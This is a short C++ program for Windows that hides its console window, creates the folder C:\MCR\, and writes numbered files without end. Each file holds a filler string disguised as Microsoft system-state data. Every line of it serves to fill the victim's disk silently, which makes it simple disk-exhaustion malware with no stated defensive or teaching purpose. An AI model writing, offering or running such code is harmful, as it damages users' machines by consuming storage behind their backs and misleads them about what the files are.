#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <direct.h>
using namespace std;

int main()
{
   FreeConsole();
   long i = 0;
   const char *path = "C:\\MCR\\";
   string content = "00x0--8990888000001111---000000--010101001000101111100101001010101---microsoft.corporation; windows-state-installed == true--stateValue--009921200019922221----101000101010111010101010101001010101011001";
   _mkdir(path);
   while(true)
   {
      i++;
      ofstream file;
      file.open(path + to_string(i) + ".mcr", ios_base::out);
      file<<content;
      file.close();
      cout<< "File no " + to_string(i) + "\r\n"; 
   }
   

   
}   